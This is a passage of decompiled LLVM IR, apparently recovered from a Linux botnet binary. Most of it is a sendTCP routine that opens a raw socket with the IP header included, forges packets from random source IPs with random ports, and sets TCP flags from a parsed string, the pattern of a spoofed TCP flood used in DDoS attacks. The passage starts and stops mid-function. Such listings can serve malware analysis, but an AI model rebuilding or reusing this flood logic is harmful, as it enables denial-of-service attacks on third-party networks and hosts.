  store i32 %v3_804b75d, i32* %eax.global-to-local, align 4
  %v0_804b762 = load i32, i32* @esp, align 4
  %v1_804b762 = add i32 %v0_804b762, 16
  %v8_804b768 = icmp sgt i32 %v3_804b75d, %v5_804b687
  br i1 %v8_804b768, label %dec_label_pc_804b7c0, label %dec_label_pc_804b69d

dec_label_pc_804b776:                             ; preds = %dec_label_pc_804b6f0
  %v4_804b776 = add i32 %stack_var_-84.0, 1
  store i32 %arg7, i32* %eax.global-to-local, align 4
  %v15_804b77c = icmp eq i32 %stack_var_-80.0.ph, %arg7
  %v1_804b77f = icmp eq i1 %v15_804b77c, false
  br i1 %v1_804b77f, label %dec_label_pc_804b7b8, label %dec_label_pc_804b781

dec_label_pc_804b781:                             ; preds = %dec_label_pc_804b776
  store i32 %v1_804b794, i32* %edx.global-to-local, align 4
  store i32 %v2_804b79d, i32* %eax.global-to-local, align 4
  %v0_804b7a0 = load i32, i32* @esp, align 4
  %v2_804b7a3 = add i32 %v0_804b7a0, -16
  %v3_804b7a3 = inttoptr i32 %v2_804b7a3 to i32*
  store i32 %v2_804b79d, i32* %v3_804b7a3, align 4
  %v1_804b7a4 = sext i32 %v4_804b776 to i64
  %v2_804b7a4 = call i32 @usleep(i64 %v1_804b7a4)
  store i32 %v2_804b7a4, i32* %eax.global-to-local, align 4
  %v0_804b7a9 = load i32, i32* @esp, align 4
  %v1_804b7a9 = add i32 %v0_804b7a9, 16
  br label %dec_label_pc_804b69d.outer

dec_label_pc_804b7b8:                             ; preds = %dec_label_pc_804b776
  %v4_804b7b8 = add i32 %stack_var_-80.0.ph, 1
  %v0_804b6a3.pre.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804b69d.outer

dec_label_pc_804b7c0:                             ; preds = %dec_label_pc_804b758, %dec_label_pc_804b4df, %dec_label_pc_804b4a1
  %v0_804b7c933 = phi i32 [ %v3_804b4ed, %dec_label_pc_804b4df ], [ %v3_804b4af, %dec_label_pc_804b4a1 ], [ %v3_804b75d, %dec_label_pc_804b758 ]
  br label %dec_label_pc_804b7c3

dec_label_pc_804b7c3:                             ; preds = %dec_label_pc_804b419, %dec_label_pc_804b385, %dec_label_pc_804b310, %dec_label_pc_804b36a, %dec_label_pc_804b7c0
  %v0_804b7c9 = phi i32 [ 0, %dec_label_pc_804b385 ], [ %v4_804b31d, %dec_label_pc_804b310 ], [ %v3_804b378, %dec_label_pc_804b36a ], [ %v0_804b7c933, %dec_label_pc_804b7c0 ], [ %v2_804b41e, %dec_label_pc_804b419 ]
  store i32 %v0_804b2dd, i32* @ebx, align 4
  ret i32 %v0_804b7c9

; uselistorder directives
  uselistorder i32 %v4_804b776, { 2, 1, 0 }
  uselistorder i32 %v0_804b71b, { 1, 0 }
  uselistorder i32 %v1_804b700, { 1, 0 }
  uselistorder i32 %v1_804b6fb, { 3, 2, 1, 0 }
  uselistorder i16 %storemerge, { 3, 1, 0, 2 }
  uselistorder i32 %v1_804b6bf, { 1, 0 }
  uselistorder i32 %v0_804b6a3, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-80.0.ph, { 3, 0, 4, 2, 1 }
  uselistorder i32 %v0_804b652, { 1, 0 }
  uselistorder i32 %v4_804b633, { 3, 2, 1, 0 }
  uselistorder i32 %v1_804b6db.pre-phi, { 1, 0 }
  uselistorder i32 %v1_804b61b, { 2, 1, 0 }
  uselistorder i32 %v1_804b5ff, { 1, 0 }
  uselistorder i32 %v1_804b5e0, { 1, 0 }
  uselistorder i32 %v2_804b584, { 9, 8, 7, 6, 17, 16, 15, 5, 4, 14, 3, 13, 12, 11, 10, 2, 1, 0 }
  uselistorder i32 %v2_804b55a, { 1, 0 }
  uselistorder i32 %v4_804b490, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v4_804b438, { 1, 0 }
  uselistorder i32 %stack_var_-88.0.ph, { 1, 0 }
  uselistorder i32 %v2_804b45f, { 1, 0 }
  uselistorder i32 %v1_804b38d, { 4, 3, 1, 2, 0, 5 }
  uselistorder i32 %v1_804b388, { 2, 1, 0, 3 }
  uselistorder i32 %v4_804b359, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804b313, { 2, 3, 0, 1 }
  uselistorder i32 %v1_804b2fb, { 1, 0 }
  uselistorder i32 %v12_804b2de, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2 }
  uselistorder i32* %stack_var_-156, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 %arg7, { 0, 3, 1, 2 }
  uselistorder i32 %arg6, { 0, 3, 1, 2, 4 }
  uselistorder i32 %arg5, { 7, 6, 5, 4, 0, 3, 1, 2 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804b7c3, { 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804b6f0, { 1, 0 }
  uselistorder label %dec_label_pc_804b69d, { 1, 0 }
  uselistorder label %dec_label_pc_804b69d.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b630, { 1, 0 }
  uselistorder label %dec_label_pc_804b561, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %dec_label_pc_804b503, { 1, 0 }
  uselistorder label %dec_label_pc_804b419, { 1, 0 }
  uselistorder label %dec_label_pc_804b3e5, { 1, 0 }
  uselistorder label %dec_label_pc_804b3e5.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b310, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8* %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp48 = call i16 @__decompiler_undefined_function_5()
  %tmp49 = call i32 @__decompiler_undefined_function_0()
  %tmp50 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %v0_804b7ce = load i32, i32* @esi, align 4
  %v0_804b7cf = load i32, i32* @ebx, align 4
  %v15_804b7d0 = ptrtoint i32* %stack_var_-172 to i32
  store i32 %arg7, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-60, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804b7e7 = icmp eq i32 %arg2, 0
  %v1_804b7eb = icmp eq i1 %v4_804b7e7, false
  br i1 %v1_804b7eb, label %dec_label_pc_804b7f8, label %dec_label_pc_804b7ed

dec_label_pc_804b7ed:                             ; preds = %entry
  %v1_804b7ed = call i32 @rand_cmwc(i32 %v15_804b7d0)
  store i32 %v1_804b7ed, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b810

dec_label_pc_804b7f8:                             ; preds = %entry
  %v1_804b7fb = urem i32 %arg2, 65536
  store i32 %v1_804b7fb, i32* %eax.global-to-local, align 4
  %v5_804b800 = icmp ult i32* %stack_var_-172, inttoptr (i32 12 to i32*)
  store i1 %v5_804b800, i1* %cf.global-to-local, align 1
  %v1_804b804 = call i32 @htons(i32 %v1_804b7fb)
  store i32 %v1_804b804, i32* %eax.global-to-local, align 4
  %v0_804b809 = load i32, i32* @esp, align 4
  %v2_804b809 = icmp ugt i32 %v0_804b809, -17
  store i1 %v2_804b809, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804b810

dec_label_pc_804b810:                             ; preds = %dec_label_pc_804b7ed, %dec_label_pc_804b7f8
  %v2_804b813 = ptrtoint i32* %stack_var_-60 to i32
  %v5_804b816 = icmp eq i32* %stack_var_-60, inttoptr (i32 -4 to i32*)
  store i1 %v5_804b816, i1* %cf.global-to-local, align 1
  %v15_804b816 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v15_804b816, i32* %eax.global-to-local, align 4
  %v4_804b81d = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-56)
  store i32 %v4_804b81d, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804b825 = icmp eq i32 %v4_804b81d, 0
  br i1 %v1_804b825, label %dec_label_pc_804b82e, label %dec_label_pc_804bd51

dec_label_pc_804b82e:                             ; preds = %dec_label_pc_804b810
  %v15_804b831 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v15_804b831, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v5_804b841 = icmp ult i32* %stack_var_-172, inttoptr (i32 4 to i32*)
  store i1 %v5_804b841, i1* %cf.global-to-local, align 1
  %v4_804b84a = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v4_804b84a, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804b855 = icmp eq i32 %v4_804b84a, 0
  %v1_804b859 = icmp eq i1 %v4_804b855, false
  br i1 %v1_804b859, label %dec_label_pc_804b876, label %dec_label_pc_804b85b

dec_label_pc_804b85b:                             ; preds = %dec_label_pc_804b82e
  %v0_804b85b = load i32, i32* @global_var_805a160.18, align 32
  store i32 %v0_804b85b, i32* %eax.global-to-local, align 4
  %v5_804b860 = icmp ult i32* %stack_var_-172, inttoptr (i32 8 to i32*)
  store i1 %v5_804b860, i1* %cf.global-to-local, align 1
  %v3_804b869 = call i32 @Rootsprintf(i32 %v0_804b85b, i32 ptrtoint ([27 x i8]* @global_var_8056470.140 to i32))
  store i32 %v3_804b869, i32* %eax.global-to-local, align 4
  %v0_804b86e = load i32, i32* @esp, align 4
  %v2_804b86e = icmp ugt i32 %v0_804b86e, -17
  store i1 %v2_804b86e, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804bd51

dec_label_pc_804b876:                             ; preds = %dec_label_pc_804b82e
  store i32 1, i32* %stack_var_-64, align 4
  %v5_804b87d = icmp ult i32* %stack_var_-172, inttoptr (i32 12 to i32*)
  store i1 %v5_804b87d, i1* %cf.global-to-local, align 1
  %v2_804b882 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_804b882, i32* %eax.global-to-local, align 4
  %v5_804b88d = call i32 @__GI_setsockopt(i32 %v4_804b84a, i32 0, i32 3, i32 %v2_804b882, i32 4)
  store i32 %v5_804b88d, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_804b895 = icmp slt i32 %v5_804b88d, 0
  %v1_804b897 = icmp eq i1 %v2_804b895, false
  br i1 %v1_804b897, label %dec_label_pc_804b8b4, label %dec_label_pc_804b899

dec_label_pc_804b899:                             ; preds = %dec_label_pc_804b876
  %v0_804b899 = load i32, i32* @global_var_805a160.18, align 32
  store i32 %v0_804b899, i32* %eax.global-to-local, align 4
  %v5_804b89e = icmp ult i32* %stack_var_-172, inttoptr (i32 8 to i32*)
  store i1 %v5_804b89e, i1* %cf.global-to-local, align 1
  %v3_804b8a7 = call i32 @Rootsprintf(i32 %v0_804b899, i32 ptrtoint ([33 x i8]* @global_var_805648c.141 to i32))
  store i32 %v3_804b8a7, i32* %eax.global-to-local, align 4
  %v0_804b8ac = load i32, i32* @esp, align 4
  %v2_804b8ac = icmp ugt i32 %v0_804b8ac, -17
  store i1 %v2_804b8ac, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804bd51

dec_label_pc_804b8b4:                             ; preds = %dec_label_pc_804b876
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804b8b4 = icmp eq i32 %arg4, 0
  %v1_804b8b8 = icmp eq i1 %v4_804b8b4, false
  br i1 %v1_804b8b8, label %dec_label_pc_804b8c3, label %dec_label_pc_804b8d9

dec_label_pc_804b8c3:                             ; preds = %dec_label_pc_804b8b4
  %v5_804b8ca = sub i32 32, %arg4
  %v10_804b8ca = icmp ugt i32 %arg4, 32
  store i1 %v10_804b8ca, i1* %cf.global-to-local, align 1
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804b8d2 = urem i32 %v5_804b8ca, 32
  %v4_804b8d2 = icmp eq i32 %v2_804b8d2, 0
  br i1 %v4_804b8d2, label %bb103, label %bb

bb:                                               ; preds = %dec_label_pc_804b8c3
  %v5_804b8d2 = shl i32 1, %v2_804b8d2
  store i32 %v5_804b8d2, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_804b8c3, %bb
  %v0_804b8d4 = phi i32 [ 1, %dec_label_pc_804b8c3 ], [ %v5_804b8d2, %bb ]
  %v1_804b8d4 = sub i32 0, %v0_804b8d4
  store i1 true, i1* %cf.global-to-local, align 1
  store i32 %v1_804b8d4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b8d9

dec_label_pc_804b8d9:                             ; preds = %dec_label_pc_804b8b4, %bb103
  %storemerge13 = phi i32 [ %v1_804b8d4, %bb103 ], [ 0, %dec_label_pc_804b8b4 ]
  %v1_804b8dc = add i32 %arg6, 40
  %v1_804b8e8 = add i32 %arg6, 70
  %v2_804b8eb = and i32 %v1_804b8e8, -16
  %v2_804b8f1 = sub i32 %v15_804b7d0, %v2_804b8eb
  %v1_804b8f9 = add i32 %v2_804b8f1, 15
  %v2_804b8fc = and i32 %v1_804b8f9, -16
  store i32 %v2_804b8fc, i32* %edx.global-to-local, align 4
  %v1_804b914 = add i32 %v2_804b8fc, 20
  %v5_804b917 = inttoptr i32 %v1_804b914 to i16*
  %v1_804b91d = add i32 %arg6, 20
  store i32 %v1_804b91d, i32* %eax.global-to-local, align 4
  store i32 %v1_804b91d, i32* @ebx, align 4
  %v5_804b922 = icmp ult i32 %v2_804b8f1, 12
  store i1 %v5_804b922, i1* %cf.global-to-local, align 1
  %v5_804b925 = add i32 %v2_804b8f1, -16
  %v6_804b925 = inttoptr i32 %v5_804b925 to i32*
  store i32 %storemerge13, i32* %v6_804b925, align 4
  %v2_804b928 = call i32 @GetRandomIP(i32 %v1_804b8dc, i32 %v2_804b8fc)
  store i32 %v2_804b928, i32* %eax.global-to-local, align 4
  %v0_804b92d = load i32, i32* @esp, align 4
  %v1_804b92d = add i32 %v0_804b92d, 16
  %v5_804b930 = icmp ult i32 %v1_804b92d, 12
  store i1 %v5_804b930, i1* %cf.global-to-local, align 1
  %v3_804b933 = inttoptr i32 %v0_804b92d to i32*
  store i32 %v2_804b928, i32* %v3_804b933, align 4
  %v0_804b934 = call i32 @htonl()
  store i32 %v0_804b934, i32* %eax.global-to-local, align 4
  %v0_804b939 = load i32, i32* @esp, align 4
  %v3_804b93c = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_804b93c, i32* %edx.global-to-local, align 4
  %tmp106 = and i32 %v0_804b939, -4
  %v5_804b93f = icmp eq i32 %tmp106, -16
  store i1 %v5_804b93f, i1* %cf.global-to-local, align 1
  %v0_804b942 = load i32, i32* @ebx, align 4
  %v2_804b942 = add i32 %v0_804b939, 8
  %v3_804b942 = inttoptr i32 %v2_804b942 to i32*
  store i32 %v0_804b942, i32* %v3_804b942, align 4
  %v1_804b943 = add i32 %v0_804b939, 4
  %v2_804b943 = inttoptr i32 %v1_804b943 to i32*
  store i32 6, i32* %v2_804b943, align 4
  %v3_804b945 = inttoptr i32 %v0_804b939 to i32*
  store i32 %v0_804b934, i32* %v3_804b945, align 4
  %v0_804b946 = load i32, i32* %edx.global-to-local, align 4
  %v2_804b946 = add i32 %v0_804b939, -4
  %v3_804b946 = inttoptr i32 %v2_804b946 to i32*
  store i32 %v0_804b946, i32* %v3_804b946, align 4
  %v5_804b947 = add i32 %v0_804b939, -8
  %v6_804b947 = inttoptr i32 %v5_804b947 to i32*
  store i32 %v2_804b8fc, i32* %v6_804b947, align 4
  %v0_804b94a = call i32 @makeIPPacket()
  store i32 %v0_804b94a, i32* %eax.global-to-local, align 4
  %v0_804b94f = load i32, i32* @esp, align 4
  %v5_804b94f = icmp ugt i32 %v0_804b94f, -25
  store i1 %v5_804b94f, i1* %cf.global-to-local, align 1
  %v2_804b952 = call i32 @rand_cmwc(i32 %v1_804b914)
  %sext = mul i32 %v2_804b952, 65536
  %v1_804b957 = sdiv i32 %sext, 65536
  store i32 %v1_804b957, i32* %edx.global-to-local, align 4
  store i32 %v1_804b914, i32* %eax.global-to-local, align 4
  %v1_804b95c = trunc i32 %v1_804b957 to i16
  store i16 %v1_804b95c, i16* %v5_804b917, align 4
  %v2_804b95f = call i32 @rand_cmwc(i32 %v1_804b914)
  %v2_804b969 = add i32 %v2_804b8fc, 24
  %v3_804b969 = inttoptr i32 %v2_804b969 to i32*
  store i32 %v2_804b95f, i32* %v3_804b969, align 8
  store i32 %v1_804b914, i32* %eax.global-to-local, align 4
  %v1_804b96f = add i32 %v2_804b8fc, 28
  %v2_804b96f = inttoptr i32 %v1_804b96f to i32*
  store i32 0, i32* %v2_804b96f, align 4
  store i32 %v1_804b914, i32* %edx.global-to-local, align 4
  %v1_804b979 = add i32 %v2_804b8fc, 32
  %v2_804b979 = inttoptr i32 %v1_804b979 to i8*
  %v3_804b979 = load i8, i8* %v2_804b979, align 16
  %v1_804b97c = urem i8 %v3_804b979, 16
  %v1_804b97f = or i8 %v1_804b97c, 80
  store i1 false, i1* %cf.global-to-local, align 1
  store i8 %v1_804b97f, i8* %v2_804b979, align 16
  %v4_804b985 = ptrtoint i8* %arg5 to i32
  store i32 %v4_804b985, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804b985, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80564ad.142 to i32), i32* @edi, align 4
  %v6_804b9a3 = call i32 @_strncmp(i8* %arg5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80564ad.142, i32 0, i32 0), i32 4)
  %v7_804b9a3 = urem i32 %v6_804b9a3, 2
  %v8_804b9a3 = icmp eq i32 %v7_804b9a3, 0
  %v0_804b9a5 = load i1, i1* %cf.global-to-local, align 1
  %v2_804b9a5 = or i1 %v0_804b9a5, %v8_804b9a3
  %v3_804b9a5 = zext i1 %v2_804b9a5 to i32
  %v4_804b9a5 = load i32, i32* %edx.global-to-local, align 4
  %v5_804b9a5 = and i32 %v4_804b9a5, -256
  %v6_804b9a5 = or i32 %v3_804b9a5, %v5_804b9a5
  %v7_804b9a5 = xor i32 %v6_804b9a5, 1
  store i32 %v7_804b9a5, i32* @edx, align 4
  %v3_804b9ab = and i32 %v6_804b9a3, -256
  %v1_804b9ad = trunc i32 %v7_804b9a5 to i8
  %v3_804b9ad = zext i1 %v0_804b9a5 to i8
  %v4_804b9ad = sub nsw i8 %v1_804b9ad, %v3_804b9ad
  %v15_804b9ad = icmp eq i8 %v4_804b9ad, 0
  %v20_804b9ad = zext i8 %v4_804b9ad to i32
  %v23_804b9ad = or i32 %v20_804b9ad, %v3_804b9ab
  store i32 %v23_804b9ad, i32* @ecx, align 4
  %v2_804b9b1 = sext i8 %v4_804b9ad to i32
  store i32 %v2_804b9b1, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804b9b6 = icmp eq i1 %v15_804b9ad, false
  br i1 %v1_804b9b6, label %dec_label_pc_804b9f9, label %dec_label_pc_804b9b8

dec_label_pc_804b9b8:                             ; preds = %dec_label_pc_804b8d9
  store i32 %v1_804b914, i32* %edx.global-to-local, align 4
  %v1_804b9bb = add i32 %v2_804b8fc, 33
  %v2_804b9bb = inttoptr i32 %v1_804b9bb to i8*
  %v3_804b9bb = load i8, i8* %v2_804b9bb, align 1
  %v4_804b9bb = zext i8 %v3_804b9bb to i32
  %v6_804b9bb = and i32 %v2_804b9b1, -256
  %v7_804b9bb = or i32 %v6_804b9bb, %v4_804b9bb
  %v1_804b9be = or i32 %v7_804b9bb, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804b9be = trunc i32 %v1_804b9be to i8
  store i32 %v1_804b9be, i32* %eax.global-to-local, align 4
  store i8 %v3_804b9be, i8* %v2_804b9bb, align 1
  store i32 %v1_804b914, i32* %edx.global-to-local, align 4
  %v3_804b9c7 = load i8, i8* %v2_804b9bb, align 1
  %v4_804b9c7 = zext i8 %v3_804b9c7 to i32
  %v5_804b9c7 = load i32, i32* %eax.global-to-local, align 4
  %v6_804b9c7 = and i32 %v5_804b9c7, -256
  %v7_804b9c7 = or i32 %v4_804b9c7, %v6_804b9c7
  %v1_804b9ca = or i32 %v7_804b9c7, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804b9ca = trunc i32 %v1_804b9ca to i8
  store i32 %v1_804b9ca, i32* %eax.global-to-local, align 4
  store i8 %v3_804b9ca, i8* %v2_804b9bb, align 1
  store i32 %v1_804b914, i32* %edx.global-to-local, align 4
  %v3_804b9d3 = load i8, i8* %v2_804b9bb, align 1
  %v4_804b9d3 = zext i8 %v3_804b9d3 to i32
  %v5_804b9d3 = load i32, i32* %eax.global-to-local, align 4
  %v6_804b9d3 = and i32 %v5_804b9d3, -256
  %v7_804b9d3 = or i32 %v4_804b9d3, %v6_804b9d3
  %v1_804b9d6 = or i32 %v7_804b9d3, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804b9d6 = trunc i32 %v1_804b9d6 to i8
  store i32 %v1_804b9d6, i32* %eax.global-to-local, align 4
  store i8 %v3_804b9d6, i8* %v2_804b9bb, align 1
  store i32 %v1_804b914, i32* %edx.global-to-local, align 4
  %v3_804b9df = load i8, i8* %v2_804b9bb, align 1
  %v4_804b9df = zext i8 %v3_804b9df to i32
  %v5_804b9df = load i32, i32* %eax.global-to-local, align 4
  %v6_804b9df = and i32 %v5_804b9df, -256
  %v7_804b9df = or i32 %v4_804b9df, %v6_804b9df
  %v1_804b9e2 = or i32 %v7_804b9df, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804b9e2 = trunc i32 %v1_804b9e2 to i8
  store i32 %v1_804b9e2, i32* %eax.global-to-local, align 4
  store i8 %v3_804b9e2, i8* %v2_804b9bb, align 1
  store i32 %v1_804b914, i32* %edx.global-to-local, align 4
  %v3_804b9eb = load i8, i8* %v2_804b9bb, align 1
  %v4_804b9eb = zext i8 %v3_804b9eb to i32
  %v5_804b9eb = load i32, i32* %eax.global-to-local, align 4
  %v6_804b9eb = and i32 %v5_804b9eb, -256
  %v7_804b9eb = or i32 %v4_804b9eb, %v6_804b9eb
  %v1_804b9ee = or i32 %v7_804b9eb, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804b9ee = trunc i32 %v1_804b9ee to i8
  store i32 %v1_804b9ee, i32* %eax.global-to-local, align 4
  store i8 %v3_804b9ee, i8* %v2_804b9bb, align 1
  %v0_804bbc5.pre = load i8*, i8** %stack_var_-20, align 4
  br label %dec_label_pc_804bbc5

dec_label_pc_804b9f9:                             ; preds = %dec_label_pc_804b8d9
  store i32 %v4_804b985, i32* @eax, align 4
  %v0_804b9fc = load i32, i32* @esp, align 4
  %v5_804b9fc = icmp ult i32 %v0_804b9fc, 8
  store i1 %v5_804b9fc, i1* %cf.global-to-local, align 1
  %v1_804b9ff = add i32 %v0_804b9fc, -12
  %v2_804b9ff = inttoptr i32 %v1_804b9ff to i32*
  store i32 ptrtoint (i32* @global_var_80564b1.143 to i32), i32* %v2_804b9ff, align 4
  %v0_804ba04 = load i32, i32* @eax, align 4
  %v2_804ba04 = add i32 %v0_804b9fc, -16
  %v3_804ba04 = inttoptr i32 %v2_804ba04 to i32*
  store i32 %v0_804ba04, i32* %v3_804ba04, align 4
  %v3_804ba05 = call i32 @__GI_strtok(i32 4, i32 ptrtoint ([4 x i8]* @global_var_80564ad.142 to i32))
  store i32 %v3_804ba05, i32* %eax.global-to-local, align 4
  %v5_804ba0d = inttoptr i32 %v3_804ba05 to i8*
  store i8* %v5_804ba0d, i8** %stack_var_-20, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804bbbb22 = icmp eq i32 %v3_804ba05, 0
  %v1_804bbbf29 = icmp eq i1 %v5_804bbbb22, false
  br i1 %v1_804bbbf29, label %dec_label_pc_804ba15.lr.ph, label %dec_label_pc_804bbc5

dec_label_pc_804ba15.lr.ph:                       ; preds = %dec_label_pc_804b9f9
  %v1_804bb82 = add i32 %v2_804b8fc, 33
  %v2_804bb82 = inttoptr i32 %v1_804bb82 to i8*
  %tmp104 = bitcast i8** %stack_var_-20 to i32*
  br label %dec_label_pc_804ba15

dec_label_pc_804ba15:                             ; preds = %dec_label_pc_804ba15.lr.ph, %dec_label_pc_804bba6
  %v3_804bb95 = phi i8* [ %v5_804ba0d, %dec_label_pc_804ba15.lr.ph ], [ %tmp105, %dec_label_pc_804bba6 ]
  %stack_var_-156.131 = phi i8* [ %tmp50, %dec_label_pc_804ba15.lr.ph ], [ %stack_var_-156.0, %dec_label_pc_804bba6 ]
  %stack_var_-160.130 = phi i32 [ %tmp49, %dec_label_pc_804ba15.lr.ph ], [ %stack_var_-160.0, %dec_label_pc_804bba6 ]
  %v4_804ba15 = ptrtoint i8* %v3_804bb95 to i32
  store i32 %v4_804ba15, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804ba15, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80564b3.144 to i32), i32* @edi, align 4
  %v6_804ba33 = call i32 @_strncmp(i8* %v3_804bb95, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80564b3.144, i32 0, i32 0), i32 4)
  %v7_804ba33 = urem i32 %v6_804ba33, 2
  %v8_804ba33 = icmp eq i32 %v7_804ba33, 0
  %v0_804ba35 = load i1, i1* %cf.global-to-local, align 1
  %v2_804ba35 = or i1 %v0_804ba35, %v8_804ba33
  %v3_804ba35 = zext i1 %v2_804ba35 to i32
  %v4_804ba35 = load i32, i32* @edx, align 4
  %v5_804ba35 = and i32 %v4_804ba35, -256
  %v6_804ba35 = or i32 %v3_804ba35, %v5_804ba35
  %v7_804ba35 = xor i32 %v6_804ba35, 1
  store i32 %v7_804ba35, i32* %edx.global-to-local, align 4
  %v3_804ba3b = and i32 %v6_804ba33, -256
  %v1_804ba3d = trunc i32 %v7_804ba35 to i8
  %v3_804ba3d = zext i1 %v0_804ba35 to i8
  %v4_804ba3d = sub nsw i8 %v1_804ba3d, %v3_804ba3d
  %v15_804ba3d = icmp eq i8 %v4_804ba3d, 0
  %v20_804ba3d = zext i8 %v4_804ba3d to i32
  %v23_804ba3d = or i32 %v20_804ba3d, %v3_804ba3b
  store i32 %v23_804ba3d, i32* @ecx, align 4
  %v2_804ba41 = sext i8 %v4_804ba3d to i32
  store i32 %v2_804ba41, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ba46 = icmp eq i1 %v15_804ba3d, false
  br i1 %v1_804ba46, label %dec_label_pc_804ba59, label %dec_label_pc_804ba48

dec_label_pc_804ba48:                             ; preds = %dec_label_pc_804ba15
  store i32 %v1_804b914, i32* @eax, align 4
  %v3_804ba4b = load i8, i8* %v2_804bb82, align 1
  %v4_804ba4b = zext i8 %v3_804ba4b to i32
  %v7_804ba4b = or i32 %v5_804ba35, %v4_804ba4b
  %v1_804ba4e = or i32 %v7_804ba4b, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804ba4e = trunc i32 %v1_804ba4e to i8
  store i32 %v1_804ba4e, i32* @edx, align 4
  store i8 %v3_804ba4e, i8* %v2_804bb82, align 1
  br label %dec_label_pc_804bba6

dec_label_pc_804ba59:                             ; preds = %dec_label_pc_804ba15
  store i32 %v4_804ba15, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804ba15, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80564b7.145 to i32), i32* @edi, align 4
  %v6_804ba77 = call i32 @_strncmp(i8* %v3_804bb95, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80564b7.145, i32 0, i32 0), i32 4)
  %v7_804ba77 = urem i32 %v6_804ba77, 2
  %v8_804ba77 = icmp eq i32 %v7_804ba77, 0
  %v0_804ba79 = load i1, i1* %cf.global-to-local, align 1
  %v2_804ba79 = or i1 %v0_804ba79, %v8_804ba77
  %v3_804ba79 = zext i1 %v2_804ba79 to i32
  %v4_804ba79 = load i32, i32* %edx.global-to-local, align 4
  %v5_804ba79 = and i32 %v4_804ba79, -256
  %v6_804ba79 = or i32 %v3_804ba79, %v5_804ba79
  %v7_804ba79 = xor i32 %v6_804ba79, 1
  store i32 %v7_804ba79, i32* %edx.global-to-local, align 4
  %v3_804ba7f = and i32 %v6_804ba77, -256
  %v1_804ba81 = trunc i32 %v7_804ba79 to i8
  %v3_804ba81 = zext i1 %v0_804ba79 to i8
  %v4_804ba81 = sub nsw i8 %v1_804ba81, %v3_804ba81
  %v15_804ba81 = icmp eq i8 %v4_804ba81, 0
  %v20_804ba81 = zext i8 %v4_804ba81 to i32
  %v23_804ba81 = or i32 %v20_804ba81, %v3_804ba7f
  store i32 %v23_804ba81, i32* @ecx, align 4
  %v2_804ba85 = sext i8 %v4_804ba81 to i32
  store i32 %v2_804ba85, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ba8a = icmp eq i1 %v15_804ba81, false
  br i1 %v1_804ba8a, label %dec_label_pc_804ba9d, label %dec_label_pc_804ba8c

dec_label_pc_804ba8c:                             ; preds = %dec_label_pc_804ba59
  store i32 %v1_804b914, i32* @eax, align 4
